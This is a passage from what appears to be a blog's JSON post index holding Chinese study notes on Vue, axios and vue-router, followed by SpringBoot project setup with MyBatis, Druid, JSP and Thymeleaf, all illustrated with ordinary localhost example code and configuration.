Vue({ el:\"#container\", methods:{ test1:function(){ //发送异步请求 axios.all([listMusics(),getMusicDetail()]).then(axios.spread(function (r1, r2) { // 两个请求现在都执行完成 console.log(r1); console.log(r2); })); } } }); function listMusics() { return axios.get('http://localhost:9999/music/search?s=成都'); } function getMusicDetail() { return axios.get('http://localhost:9999/music/detail?id=25640392'); } &lt;/script&gt; 12.5 箭头函数12.5.1 axios回调函数的参数res res并不是接口返回的数据，而是表示一个响应对象；res.data才表示接口响应的数据 12.5.2 箭头函数&lt;script type=\"text/javascript\"&gt; var vm = new Vue({ el:\"#container\", data:{ song:{ } }, methods:{ test1:function(){ //发送异步请求 axios.get(\"http://localhost:9999/music/detail?id=25640392\").then( (res)=&gt;{ // res并不是接口返回的数据，而是表示一个响应对象；res.data才表示接口响应的数据 if(res.data.code == 200){ this.song = res.data.songs[0]; } }); } } }); &lt;/script&gt; 十三、路由 router router是由vue官方提供的用于实现组件跳转的插件 13.1 路由插件的引用13.3.1 离线&lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\" src=\"js/vue-router.js\"&gt;&lt;/script&gt; 13.3.2 在线CDN&lt;script src=\"https://unpkg.com/vue/dist/vue.js\"&gt;&lt;/script&gt; &lt;script src=\"https://unpkg.com/vue-router/dist/vue-router.js\"&gt;&lt;/script&gt; 13.2 路由使用案例&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=\"text/css\"&gt; body{padding: 0px;margin: 0px;} ul{list-style: none;} ul li{display: inline; float: left; margin-left: 15px; margin-bottom: 15px;} ul li a{text-decoration: none; color: white; font-size: 18px; font-weight: bold;} ul li a:hover{color: yellow;} &lt;/style&gt; &lt;script type=\"text/javascript\" src=\"js/vue.js\" &gt;&lt;/script&gt; &lt;script type=\"text/javascript\" src=\"js/vue-router.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;div style=\"width: 100%; height: 70px; background: #00BFFF;\"&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;&lt;img src=\"img/logo.png\" height=\"70\" style=\"margin-left:100px;\"/&gt;&lt;/td&gt; &lt;td&gt; &lt;ul&gt; &lt;li&gt;&lt;router-link to=\"/a\"&gt;首页&lt;/router-link&gt;&lt;/li&gt; &lt;li&gt;&lt;router-link to=\"/b\"&gt;Java&lt;/router-link&gt;&lt;/li&gt; &lt;li&gt;&lt;router-link to=\"/c\"&gt;HTML5&lt;/router-link&gt;&lt;/li&gt; &lt;li&gt;&lt;router-link to=\"/d\"&gt;Python&lt;/router-link&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/div&gt; &lt;div style=\"width: 100%; height: 680px; background: lemonchiffon;\"&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; // vue的路由旨在为单页面应用开发提供便捷 //1.定义链接跳转的模板（组件） const t1 = {template:`&lt;p&gt;index&lt;/p&gt;`}; const t2 = {template:`&lt;p&gt;Java&lt;/p&gt;`}; const t3 = {template:`&lt;p&gt;HTML5&lt;/p&gt;`}; const t4 = {template:`&lt;p&gt;PYTHON&lt;/p&gt;`}; const myrouter = new VueRouter({ routes:[ {path:\"/a\",component:t1}, {path:\"/b\",component:t2}, {path:\"/c\",component:t3}, {path:\"/d\",component:t4} ] }); var vm = new Vue({ el:\"#container\", router:myrouter }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 13.3 动态路由匹配13.3.1 通配符 *可以匹配任意路径 例如： /user-* 匹配所有以user-开头的任意路径 /* 匹配所有路径 const myrouter = new VueRouter({ routes:[ {path:\"/user-*\",component:...}, {path:\"/*\",component:...} ] }); 注意如果使用通配符定义路径，需要注意路由声明的顺序 13.3.2 路由参数 /a/:id 可以匹配 /a/开头的路径 &lt;div id=\"container\"&gt; &lt;li&gt;&lt;router-link to=\"/a/101\"&gt;首页&lt;/router-link&gt;&lt;/li&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const t1 = {template:`&lt;p&gt;index:{{$route.params.id}}&lt;/p&gt;`}; const myrouter = new VueRouter({ routes:[ {path:\"/a/:id\",component:t1} ] }); var vm = new Vue({ el:\"#container\", router:myrouter }); &lt;/script&gt; 13.3.3 优先级如果一个路径匹配了多个路由，则按照路由的配置顺序：路由定义的越早优先级就越高。 13.4 嵌套路由 在一级路由的组件中显示二级路由 &lt;div id=\"container\"&gt; &lt;router-link to=\"/a\"&gt;首页&lt;/router-link&gt; &lt;router-link to=\"/a/c1\"&gt;首页-c1&lt;/router-link&gt; &lt;router-link to=\"/a/c2\"&gt;首页-c2&lt;/router-link&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const t1 = { template:\"&lt;div style='width:400px; height:200px; border:blue 1px solid'&gt;index&lt;hr/&gt;&lt;router-view&gt;&lt;/router-view&gt;&lt;/div&gt;\" }; const t2 = {template:`&lt;div&gt;t2&lt;/div&gt;`}; const t3 = {template:`&lt;div&gt;t3&lt;/div&gt;`}; const myrouter = new VueRouter({ routes:[ { path:\"/a\", component:t1, children:[ { path:\"c1\", component:t2 }, { path:\"c2\", component:t3 } ] } ] }); var vm = new Vue({ el:\"#container\", router:myrouter }); &lt;/script&gt; 13.5 编程式导航13.5.1 push()&lt;div id=\"container\"&gt; &lt;button type=\"button\" @click=\"test\"&gt;按钮&lt;/button&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const t1 = { template:\"&lt;div style='width:400px; height:200px; border:blue 1px solid'&gt;index&lt;/div&gt;\" }; const myrouter = new VueRouter({ routes:[ { path:\"/a\", component:t1 } ] }); var vm = new Vue({ el:\"#container\", router:myrouter, methods:{ test:function(){ //js代码实现路由跳转：编程式导航 myrouter.push(\"/a\"); } } }); &lt;/script&gt; 13.5.2 push()参数//1.字符串 myrouter.push(\"/a\"); //2.对象 myrouter.push({path:\"/a\"}); //3.命名的路由 name参数指的是定义路由时指定的名字 myrouter.push({name:\"r1\",params:{id:101}}); //4.URL传值，相当于/a?id=101 myrouter.push({path:\"/a\",query:{id:101}}); 13.5.3 replace() 功能与push一致，区别在于replace()不会向history添加新的浏览记录 13.5.4 go() 参数为一个整数，表示在浏览器历史记录中前后/后退多少步 相当于window.history.go(-1)的作用 13.6 命名路由 命名路由：在定义路由的时候可以给路由指定name，我们在进行路由导航时可以通过路由的名字导航 &lt;div id=\"container\"&gt; &lt;input type=\"text\" v-model=\"rname\"/&gt; &lt;router-link :to=\"{name:rname}\"&gt;t1&lt;/router-link&gt; &lt;button type=\"button\" @click=\"test\"&gt;按钮1&lt;/button&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const t1 = { template:\"&lt;div style='width:400px; height:200px; border:blue 1px solid'&gt;t1&lt;/div&gt;\" }; const t2 = { template:\"&lt;div style='width:400px; height:200px; border:red 1px solid'&gt;t2&lt;/div&gt;\" }; const myrouter = new VueRouter({ routes:[ { path:\"/a\", name:\"r1\", component:t1 }, { path:\"/b\", name:\"r2\", component:t2 } ] }); var vm = new Vue({ el:\"#container\", data:{ rname:\"r1\" }, router:myrouter, methods:{ test:function(){ myrouter.push({name:vm.rname}); } } }); &lt;/script&gt; 13.7 命名路由视图&lt;div id=\"container\"&gt; &lt;router-link to=\"/a\"&gt;t1&lt;/router-link&gt; &lt;router-link to=\"/b\"&gt;t2&lt;/router-link&gt; &lt;!--路由视图--&gt; &lt;!--如果在HTML中有一个以上的路由视图router-view，需要给router-view指定name，在路由中使用components映射多个组件根据name设置组件与router-view绑定关系--&gt; &lt;router-view name=\"v1\"&gt;&lt;/router-view&gt; &lt;router-view name=\"v2\"&gt;&lt;/router-view&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const t11 = { template:\"&lt;div style='width:400px; height:200px; border:blue 1px solid'&gt;t11&lt;/div&gt;\" }; const t12 = { template:\"&lt;div style='width:400px; height:200px; background:pink'&gt;t12&lt;/div&gt;\" }; const t21 = { template:\"&lt;div style='width:400px; height:200px; border:red 1px solid'&gt;t21&lt;/div&gt;\" }; const t22 = { template:\"&lt;div style='width:400px; height:200px; background:yellow'&gt;t22&lt;/div&gt;\" }; const myrouter = new VueRouter({ routes:[ { path:\"/a\", components:{ v1:t11, v2:t12 } }, { path:\"/b\", components:{ v1:t21, v2:t22 } } ] }); var vm = new Vue({ el:\"#container\", router:myrouter }); &lt;/script&gt; 13.8 重定向和别名13.8.1 重定向访问/b，重定向到/a &lt;div id=\"container\"&gt; &lt;router-link to=\"/a\"&gt;路径A&lt;/router-link&gt; &lt;router-link to=\"/b\"&gt;路径B&lt;/router-link&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const t1 = { template:\"&lt;div style='width:400px; height:200px; border:blue 1px solid'&gt;index&lt;/div&gt;\" }; const myrouter = new VueRouter({ routes:[ { path:\"/a\", component:t1 }, { path:\"/b\", redirect:\"/a\" } ] }); var vm = new Vue({ el:\"#container\", router:myrouter }); &lt;/script&gt; 根据路由命名重定向 const myrouter = new VueRouter({ routes:[ { path:\"/a\", name:\"r1\", component:t1 }, { path:\"/b\", //redirect:\"/a\" //根据路由路径重定向 redirect:{name:\"r1\"} //根据路由命名重定向 } ] }); 13.8.2 路由别名&lt;div id=\"container\"&gt; &lt;router-link to=\"/a\"&gt;路径A&lt;/router-link&gt; &lt;router-link to=\"/wahaha\"&gt;路径wahaha（别名）&lt;/router-link&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const t1 = { template:\"&lt;div style='width:400px; height:200px; border:blue 1px solid'&gt;index&lt;/div&gt;\" }; const myrouter = new VueRouter({ routes:[ { path:\"/a\", alias:\"/wahaha\", component:t1 } ] }); var vm = new Vue({ el:\"#container\", router:myrouter }); &lt;/script&gt; 13.9 路由组件传参可以通过/url/:attr方式实现通过路由传值给组件 &lt;div id=\"container\"&gt; &lt;router-link to=\"/a/101\"&gt;路径A&lt;/router-link&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const t1 = { template:`&lt;div style='width:400px; height:200px; border:blue 1px solid'&gt; index：{{$route.params.id}} &lt;/div&gt;` }; const myrouter = new VueRouter({ routes:[ { path:\"/a/:id\", component:t1 } ] }); var vm = new Vue({ el:\"#container\", router:myrouter }); &lt;/script&gt; 通过props传参 &lt;div id=\"container\"&gt; &lt;router-link to=\"/a/102\"&gt;路径A&lt;/router-link&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt; &lt;script type=\"text/javascript\"&gt; const t1 = { props:[\"id\"], template:`&lt;div style='width:400px; height:200px; border:blue 1px solid'&gt; index：{{id}} &lt;/div&gt;` }; const myrouter = new VueRouter({ routes:[ { path:\"/a/:id\", props:true, component:t1 } ] }); var vm = new Vue({ el:\"#container\", router:myrouter }); &lt;/script&gt;","categories":[{"name":"Java","slug":"Java","permalink":"https://bigbug888.github.io/categories/Java/"}],"tags":[{"name":"springboot项目","slug":"springboot项目","permalink":"https://bigbug888.github.io/tags/springboot%E9%A1%B9%E7%9B%AE/"}]},{"title":"SpringBoot","slug":"04-锋迷商城-随堂笔记/01-SpringBoot/SpringBoot","date":"2021-01-27T13:00:00.000Z","updated":"2021-11-25T19:15:38.468Z","comments":true,"path":"posts/9.html","link":"","permalink":"https://bigbug888.github.io/posts/9.html","excerpt":"","text":"一、项目整合与部署存在的问题1.1 SSM手动整合存在的问题 SSM整合步骤多、配置繁琐 项目进行服务器部署步骤繁琐 1.2 如何简化这些繁琐的配置和部署步骤？ SpringBoot就是一个可以简化整合过程中复杂配置的框架 二、SpringBoot简介2.1 概念 随着动态语言的流行，Java语言的开发就显得格外笨重：配置繁琐、开发效率低、项目的部署变得复杂、集成第三方技术难度大。 在这种情况下，SpringBoot就应运而生。 SpringBoot采用了习惯优于配置/约定大于配置的理念快速的搭建项目的开发环境，我们无需或者进行很少的相关spring配置就能够快速的将项目运行起来 2.2 优点 能够快速的搭建项目 对主流的开发框架都提供了无配置集成（SpringBoot内置了配置） 项目可以独立运行、无需单独配置Servlet容器（内置了Tomcat） 极大提高了开发、部署效率 提供了运行时监控系统（日志等） 与云原生有天然的集成 2.3 缺点 由于配置都是内置的，报错时定位比较困难 版本迭代速度比较快、有些版本改动还是比较大（增加学习成本） 三、第一个SpringBoot应用 体验：基于SpringBoot整合SpringMVC SpringBoot应用需要依赖远程服务器进行创建 远程服务器： Spring官方：https://start.spring.io ali：https://start.aliyun.com 3.1 创建项目3.1 File—New—Project 3.2 填写项目信息 3.3 选择项目依赖 3.4 选择项目存储目录 3.5 网页创建SpringBoot应用如果基于IDEA创建无法下载，可以基于网页版进行创建 3.2 配置项目3.2.1 应用项目结构 3.2.2 自定义配置(整合MyBatis) SpringBoot帮助我们完成通用性配置，但是像数据库连接地址、账号、密码等还是需要手动完成配置 修改mysql驱动的版本（选择性） 在SpringBoot主配置文件application.properties文件中配置数据源及路径 # 配置数据源 （key必须按照SpringBoot的要求） spring.datasource.driver-class-name=com.mysql.jdbc.Driver spring.datasource.url=jdbc:mysql://localhost:3306/db_2010_mybatis?characterEncoding=utf-8 spring.datasource.username=root spring.datasource.password=admin123 # 配置映射文件路径及实体类的包名 mybatis.mapper-locations=classpath:mappers/*Mapper.xml mybatis.type-aliases-package=com.qfedu.springboot.demo.entity 在SpringBoot启动类通过@MapperScan注解指定DAO接口的包名 @SpringBootApplication @MapperScan(\"com.qfedu.springboot.demo.dao\") public class SpringbootDemo1Application { public static void main(String[] args) { SpringApplication.run(SpringbootDemo1Application.class, args); } } 3.3 启动项目3.3.1 启动 SpringBoot应用自带Servlet容器—Tomcat,因此无需进行额外的服务器配置，运行启动类即可启动一个SpringBoot应用 3.3.2 测试 用户的注册功能 四、SpringBoot原理4.1 starter 一个starter就是一个开发场景的支持（ 依赖 + 配置） SpringBoot为我们提供了简化企业级开发绝大多数场景的支持（提供了多个starter），我们在进行项目开发的过程中只需引入对应的starter（创建SpringBoot应用时可选择），相关的依赖和配置就会被内置到项目中（消除人工配置）。 4.1.1 starter依赖 一个starter依赖表示的不是一个依赖，而是某种开发环境所需的一组依赖 Spring Web — spring-boot-starter-web MyBatis Framework — mybatis-spring-boot-starter 4.1.2 starter配置 一个starter不仅包含所需依赖，还包含了其所需的对应的配置 MyBatis Framework — mybatis-spring-boot-starter 依赖： 配置： 4.1.3 案例 引入redis开发场景 添加starter依赖 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt; &lt;/dependency&gt; 在service中可以直接注入redis客户端 @Service public class UserServiceImpl implements UserService { @Resource private UserDAO userDAO; @Resource private StringRedisTemplate stringRedisTemplate; } 4.2 SpringBoot应用的pom文件4.2.1 基于Spring官方服务器创建的SpringBoot应用 继承spring-boot-starter-parent.pom &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;!-- SpringBoot应用中的pom 继承了spring-boot-starter-parent.pom --&gt; &lt;!-- spring-boot-starter-parent.pom又继承了spring-boot-dependencies.pom--&gt; &lt;!-- 在spring-boot-dependencies.pom已经对主流的框架的版本进行了声明 --&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.4.4&lt;/version&gt; &lt;relativePath/&gt; &lt;/parent&gt; &lt;/project&gt; 引入了maven对springboot应用支持的插件 spring-boot &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;mainClass&gt;com.qfedu.springboot.demo.SpringbootDemo1Application&lt;/mainClass&gt; &lt;excludes&gt; &lt;exclude&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/exclude&gt; &lt;/excludes&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; 4.2.2 基于ali服务器创建的SpringBoot应用&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;springboot-demo2&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt; &lt;name&gt;springboot-demo2&lt;/name&gt; &lt;description&gt;Demo project for Spring Boot&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;!--SpringBoot引用的pom没有继承spring-boot-starter-parent.pom，因此版本需要在当前pom中进行定义 --&gt; &lt;spring-boot.version&gt;2.3.7.RELEASE&lt;/spring-boot.version&gt; &lt;/properties&gt; &lt;build&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;version&gt;2.3.7.RELEASE&lt;/version&gt; &lt;configuration&gt; &lt;mainClass&gt;com.qfedu.springboot.demo2.SpringbootDemo2Application&lt;/mainClass&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;repackage&lt;/id&gt; &lt;goals&gt; &lt;goal&gt;repackage&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;/project&gt; 4.3 Java配置方式 如果我们需要在SpringBoot应用中整合一种新的开发场景，只需在pom.xml引入对应的starter即可 一个starter不仅包含依赖，还包含相应的配置，starter中包含的配置都是通过Java类实现的——Java配置方式 4.3.1 Spring版本发展 随着Spring版本的迭代，配置方式也在发生变化 Spring 1.x 所有的bean的配置只能通过xml完成 Spring 2.x 基于JDK1.5对注解的支持，Spring 2.x开始支持注解 企业开发中到底是用xml配置还是用注解？ 对基础配置、引用的第三方依赖中的配置使用xml完成：例如数据源配置 业务开发使用注解：例如controller、service Spring 3.x Spring 开始提供基于Java的配置方式 Spring 4.x xml、注解、Java 4.3.2 xml配置&lt;!--applicationContext.xml--&gt; &lt;bean id=\"stu\" class=\"com.qfedu.beans.Student\"&gt;&lt;/bean&gt; &lt;bean id=\"date\" class=\"java.util.Date\"&gt;&lt;/bean&gt; 4.3.3 注解配置@Component public class Student{ } 4.3.4 Java配置方式 创建配置类 @Configuration public class SpringConfig{ @Bean public Date getDate(){ return new Date(); } } 4.4 SpringBoot自动配置 4.5 全局配置文件 SpringBoot针对不同的开发场景提供默认的属性配置，如果默认的配置不能满足开发的需要，我们需要对属性配置进行修改 SpringBoot应用提供了一个全局配置文件application.properties用于进行自定义配置 全局配置文件支持2中语法配置： properties 键值对配置 yaml 语法的配置 4.5.1 基于properties配置# 配置数据源 （key必须按照SpringBoot的要求） spring.datasource.driver-class-name=com.mysql.jdbc.Driver spring.datasource.url=jdbc:mysql://localhost:3306/db_2010_mybatis?characterEncoding=utf-8 spring.datasource.username=root spring.datasource.password=admin123 # 配置映射文件路径及实体类的包名 mybatis.mapper-locations=classpath:mappers/*Mapper.xml mybatis.type-aliases-package=com.qfedu.springboot.demo.entity 4.5.2 基于yaml配置spring: datasource: url: jdbc:mysql://localhost:3306/db_2010_mybatis?characterEncoding=utf-8 driver-class-name: com.mysql.jdbc.Driver username: root password: admin123 mybatis: mapper-locations: classpath:mappers/*Mapper.xml type-aliases-package: com.qfedu.springboot.demo.entity 4.5.3 常用的全局配置server: port: 9999 servlet: context-path: /demo1 4.6 自定义Banner 在SpringBoot应用启动的时候是有一个默认启动图案的 这个默认图案支持自定义配置 在resources目录创建一个banner.txt 在banner.txt文件中定义图案 http://patorjk.com/software/taag/ 佛祖保佑 //////////////////////////////////////////////////////////////////// // _ooOoo_ // // o8888888o // // 88\" . \"88 // // (| ^_^ |) // // O\\ = /O // // ____/`---'\\____ // // .' \\\\| |// `. // // / \\\\||| : |||// \\ // // / _||||| -:- |||||- \\ // // | | \\\\\\ - /// | | // // | \\_| ''\\---/'' | | // // \\ .-\\__ `-` ___/-. / // // ___`. .' /--.--\\ `. . ___ // // .\"\" '&lt; `.___\\_&lt;|&gt;_/___.' &gt;'\"\". // // | | : `- \\`.;`\\ _ /`;.`/ - ` : | | // // \\ \\ `-. \\_ __\\ /__ _/ .-` / / // // ========`-.____`-.___\\_____/___.-`____.-'======== // // `=---=' // // ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ // // 佛祖保佑 永不宕机 永无BUG // //////////////////////////////////////////////////////////////////// 五、SpringBoot整合JSP SpringBoot应用默认支持的动态网页技术是Thymeleaf，并不支持JSP；因此在SpringBoot应用想要使用JSP需要通过手动整合来实现 5.1 添加依赖&lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt; &lt;artifactId&gt;tomcat-embed-jasper&lt;/artifactId&gt; &lt;version&gt;9.0.45&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;/dependency&gt; 5.2 创建JSP页面 修改pom文件打包方式为war 在main中创建webapp目录 在webapp创建.jsp页面 5.3 将JSP页面放在WEB-INF中的访问 将JSP文件存放到WEB-INF目录 在application.yml文件配置SpringMVC视图解析方式： spring: mvc: view: prefix: /WEB-INF/ suffix: .jsp 创建PageController @Controller public class PageController { @RequestMapping(\"/index.html\") public String index() { return \"index\"; } } 六、基于SpringBoot的SSM整合6.1 创建Springboot项目 创建项目时添加依赖 lombok spring web mysql driver mybatis framework 修改mysql驱动的版本（可选） &lt;!--pom.xml--&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;mysql.version&gt;5.1.47&lt;/mysql.version&gt; &lt;/properties&gt; 6.2 进行MyBatis所需的配置 将默认创建的application.properties后缀名修改为yml(根据习惯可选) 完成MyBatis的自定义配置 spring: datasource: driver-class-name: com.mysql.jdbc.Driver url: jdbc:mysql://localhost:3306/db_2010_mybatis?characterEncoding=utf-8 username: root password: admin123 mybatis: type-aliases-package: com.qfedu.springboot.ssm.beans mapper-locations: classpath:mappers/*Mapper.xml 6.3 在启动类配置DAO扫描 @MapperScan @SpringBootApplication @MapperScan(\"com.qfedu.springboot.ssm.dao\") public class SpringbootSsmApplication { public static void main(String[] args) { SpringApplication.run(SpringbootSsmApplication.class, args); } } 6.4 整合Druid连接池 在SpringBoot中整合MyBatis的时候，默认集成了Hikari连接池，Hikari的效率比Druid要高，但是得益于Druid提供了比较便捷的监控系统在企业开发中，druid使用还是最多的。 6.4.1 添加druid的starter&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.1.10&lt;/version&gt; &lt;/dependency&gt; 6.4.2 配置druid数据源spring: datasource: druid: driver-class-name: com.mysql.jdbc.Driver url: jdbc:mysql://localhost:3306/db_2010_mybatis?characterEncoding=utf-8 username: root password: admin123 initial-size: 1 min-idle: 1 max-active: 20 七、Thymeleaf Thymeleaf是一种类似于JSP的动态网页技术 7.1 Thymeleaf简介 JSP 必须依赖Tomcat运行，不能直接运行在浏览器中 HTML可以直接运行在浏览器中，但是不能接收控制器传递的数据 Thymeleaf是一种既保留了HTML的后缀能够直接在浏览器运行的能力、又实现了JSP显示动态数据的功能——静能查看页面效果、动则可以显示数据 7.2 Thymeleaf的使用 SpringBoot应用对Thymeleaf提供了良好的支持 7.2.1 添加thymeleaf的starter&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt; &lt;/dependency&gt; 7.2.2 创建Thymeleaf模板 Thymeleaf模板就是HTML文件 SpringBoot应用中 resources\\templates目录就是用来存放页面模板的 重要说明： static 目录下的资源被定义静态资源，SpringBoot应用默认放行；如果将HTML页面创建static目录是可以直接访问的 templates 目录下的文件会被定义为动态网页模板，SpringBoot应用会拦截templates中定义的资源；如果将HTML文件定义在templates目录，则必须通过控制器跳转访问。 在templates创建HTML页面模板 创建PageController，用于转发允许”直接访问”的页面请求 @Controller @RequestMapping(\"/page\") public class PageController { @RequestMapping(\"/test.html\") public String test(){ return \"test\"; } } 7.3 Thymeleaf基本语法 如果要在thymeleaf模板中获取从控制传递的数据，需要使用th标签 7.3.1 在thymeleaf模板页面引入th标签的命名空间&lt;!DOCTYPE html&gt; &lt;html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;/html&gt; 7.3.2 th:text 在几乎所有的HTML双标签都可以使用 th:text属性，将接收到的数据显示在标签的内容中 &lt;label th:text=\"${price}\"&gt;&lt;/label&gt; &lt;div th:text=\"${str}\"&gt;&lt;/div&gt; &lt;p th:text=\"${book.bookName}\"&gt;&lt;/p&gt; 7.3.3 th:inline 内联 HTML内联 &lt;p th:inline=\"text\"&gt;图书名称：[[${book.bookName}]]&lt;/p&gt; CSS内联 &lt;style type=\"text/css\" th:inline=\"css\"&gt; .style1{ color:[[${color}]] } &lt;/style&gt; JavaScript内联 &lt;script type=\"css/javascript\" th:inline=\"javascript\"&gt; &lt;/script&gt; 7.3.4 th:object 和 *&lt;div th:object=\"${book}\"&gt; &lt;p th:text=\"*{bookId}\"&gt;&lt;/p&gt; &lt;p th:text=\"*{bookName}\"&gt;&lt;/p&gt; &lt;p th:text=\"*{bookAuthor}\"&gt;&lt;/p&gt; &lt;/div&gt; 7.4 流程控制7.4.1 th:each 循环&lt;table style=\"width: 600px\" border=\"1\" cellspacing=\"0\"&gt; &lt;caption&gt;图书信息列表&lt;/caption&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;图书ID&lt;/th&gt; &lt;th&gt;图书名称&lt;/th&gt; &lt;th&gt;作者&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr th:each=\"b:${books}\"&gt; &lt;td th:text=\"${b.bookId}\"&gt;&lt;/td&gt; &lt;td th:text=\"${b.bookName}\"&gt;&lt;/td&gt; &lt;td th:text=\"${b.bookAuthor}\"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt; 7.4.2 分支 th:if 如果条件不成立，则不显示此标签 &lt;td th:if=\"${b.bookPrice}&gt;40\" style=\"color:red\"&gt;太贵！！！&lt;/td&gt; &lt;td th:unless=\"${b.bookPrice}&gt;40\" style=\"color:red\"&gt;太贵！！！&lt;/td&gt; &lt;td th:if=\"${b.bookPrice}&lt;=40\" style=\"color:green\"&gt;推荐购买&lt;/td&gt; th:switch 和 th:case &lt;td th:switch=\"${b.bookPrice}/10\"&gt; &lt;label th:case=\"3\"&gt;建议购买&lt;/label&gt; &lt;label th:case=\"4\"&gt;价格合理&lt;/label&gt; &lt;label th:case=\"*\"&gt;价格不合理&lt;/label&gt; &lt;/td&gt; &lt;td th:switch=\"${user.gender}\"&gt; &lt;label th:case=\"M\"&gt;男&lt;/label&gt; &lt;label th:case=\"F\"&gt;女&lt;/label&gt; &lt;label th:case=\"*\"&gt;性别不详&lt;/label&gt; &lt;/td&gt; 7.5 碎片使用7.5.1 碎片的概念 碎片，就是HTML片段，我们可以将多个页面中使用的相同的HTML标签部分单独定义，然后通过th:include可以在HTML网页中引入定义的碎片 7.5.2 碎片使用案例 定义碎片 th:fragment header.html &lt;!DOCTYPE html&gt; &lt;html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div th:fragment=\"fragment1\" style=\"width: 100%; height: 80px;background: deepskyblue; color:white; font-size: 25px; font-family:文鼎霹雳体\"&gt; 千锋武汉Java2010班，六六六！！！ &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; footer.html &lt;!DOCTYPE html&gt; &lt;html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; 